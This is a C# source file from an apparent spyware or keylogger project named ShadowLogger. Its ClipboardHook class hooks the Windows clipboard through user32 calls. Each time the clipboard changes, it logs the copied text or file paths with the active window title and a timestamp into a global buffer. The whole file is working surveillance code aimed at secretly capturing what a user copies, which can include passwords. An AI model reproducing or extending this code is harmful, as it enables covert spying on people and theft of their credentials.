using System;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace ShadowLogger.bin.Hooks
{
    internal sealed class ClipboardHook : NativeWindow
    {
        #region " P/Invoke Declarations "

        [DllImport("user32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool AddClipboardFormatListener(IntPtr hwnd);

        [DllImport("user32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool RemoveClipboardFormatListener(IntPtr hwnd);

        #endregion


        private const int WM_CLIPBOARDUPDATE = 0x31d;

        public ClipboardHook()
        {
            CreateHandle(new CreateParams());
        }

        public void Install()
        {
            GlobalVariables.GlobalVariables.CbHookStatus = AddClipboardFormatListener(Handle);
        }

        public void Uninstall()
        {
            RemoveClipboardFormatListener(Handle);
            GlobalVariables.GlobalVariables.CbHookStatus = false;
        }

        protected override void WndProc(ref Message m)
        {
            if (m.Msg == WM_CLIPBOARDUPDATE)
            {
                CB_Changed();
            }

            base.WndProc(ref m);
        }

        private static void CB_Changed()
        {
            string timenow = DateTime.Now.ToString("(dd-MM-yyyy" + "  " + "HH:mm:ss)");

            System.Collections.Specialized.StringCollection fileList = Clipboard.GetFileDropList();

            if (fileList != null)
            {
                foreach (string filepath in fileList)
                {
                    GlobalVariables.GlobalVariables.CbData += "FILEDROP: " + filepath + " - " + HostInfo.HostInfo.GetActiveWindowTitle(IntPtr.Zero) + "   " + timenow + Environment.NewLine;
                }
            }
            else if (Clipboard.ContainsText())
            {
                GlobalVariables.GlobalVariables.CbData += Clipboard.GetText() + " - " + HostInfo.HostInfo.GetActiveWindowTitle(IntPtr.Zero) + "   " + timenow + Environment.NewLine;
            }
        }
    }
}
